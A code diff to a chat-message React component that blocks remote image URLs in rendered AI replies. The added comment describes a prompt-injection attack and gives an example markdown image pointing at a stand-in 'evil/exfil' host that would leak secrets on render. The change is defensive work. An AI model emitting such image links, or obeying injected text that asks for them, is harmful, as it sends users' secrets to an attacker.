@@ -10,7 +10,7 @@ import {
   SquareTwoStack,
   XMark,
 } from "@medusajs/icons";
-import { type IconMap, Streamdown } from "streamdown";
+import { type IconMap, Streamdown, type UrlTransform } from "streamdown";
 import { clx, IconButton, Tooltip } from "@medusajs/ui";
 import {
   Bubble,
@@ -112,16 +112,35 @@ export const MessageAction = ({
   return button;
 };
 
+// AI replies are untrusted markdown: a prompt-injected `![x](https://evil/exfil?d=<secret>)`
+// would auto-load the moment the browser renders it — no click required — so
+// the request itself (query string, headers, timing) can exfiltrate data.
+// Drop the `src` of any <img> that isn't relative or same-origin; leave
+// every other URL (links) alone — Streamdown's own link-safety modal already
+// gates those behind a confirmation.
+const dropRemoteImageSrc: UrlTransform = (url, key, node) => {
+  if (key !== "src" || node.tagName !== "img") {
+    return url;
+  }
+  try {
+    const resolved = new URL(url, window.location.origin);
+    return resolved.origin === window.location.origin ? url : undefined;
+  } catch {
+    return url;
+  }
+};
+
 export type MessageResponseProps = ComponentProps<typeof Streamdown>;
 
 export const MessageResponse = memo(
-  ({ className, icons, ...props }: MessageResponseProps) => (
+  ({ className, icons, urlTransform, ...props }: MessageResponseProps) => (
     <Streamdown
       className={clx(
         "size-full [&>*:first-child]:mt-0 [&>*:last-child]:mb-0",
         className,
       )}
       icons={{ ...designSystemIcons, ...icons }}
+      urlTransform={urlTransform ?? dropRemoteImageSrc}
       {...props}
     />
   ),
